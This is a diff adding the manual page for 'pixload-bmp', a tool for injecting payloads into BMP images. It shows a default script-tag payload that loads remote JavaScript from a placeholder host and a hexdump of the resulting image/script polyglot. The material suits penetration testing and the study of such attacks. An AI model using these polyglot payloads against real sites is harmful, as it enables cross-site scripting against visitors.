@@ -1,0 +1,72 @@
+=pod
+
+=encoding UTF-8
+
+=head1 NAME
+
+pixload-bmp - hide payload/malicious code in BMP images
+
+=head1 SYNOPSIS
+
+B<pixload-bmp> [I<OPTION>]... I<FILE>
+
+=head1 DESCRIPTION
+
+B<pixload-bmp> creates a BMP Image with payload, or injects payload
+into existing image.
+
+=head1 OPTIONS
+
+Mandatory arguments to long options are mandatory for short options too.
+
+=over 8
+
+=item B<-P>, B<--payload> I<STRING>
+
+Set payload for injection.
+Default is C<< <script src=//example.com></script> >>.
+
+=item B<-v>, B<--version>
+
+Print version and exit.
+
+=item B<-h>, B<--help>
+
+Print help and exit.
+
+=back
+
+If the output I<FILE> already exists, then B<payload> will be injected into
+this existing file. Otherwise, the new one will be created.
+
+=head1 EXAMPLE
+
+  $ pixload-bmp payload.bmp
+  ......... BMP Payload Creator/Injector ........
+  ...............................................
+  ... https://github.com/chinarulezzz/pixload ...
+  ...............................................
+
+  [>] Generating output file
+  [✔] File saved to: payload.bmp
+
+  [>] Injecting payload into payload.bmp
+  [✔] Payload was injected successfully
+
+  payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1 x 24, cbSize 10799, bits offset 26
+
+  00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
+  00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
+  00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 3d 2f  |=1;<script src=/|
+  00000030  2f 65 78 61 6d 70 6c 65  2e 63 6f 6d 3e 3c 2f 73  |/example.com></s|
+  00000040  63 72 69 70 74 3e 3b                              |cript>;|
+  00000047
+
+=head1 SEE ALSO
+
+L<pixload-gif(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-gif.1.pod>,
+L<pixload-jpg(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-jpg.1.pod>,
+L<pixload-png(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-png.1.pod>,
+L<pixload-webp(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-webp.1.pod>
+
+=cut
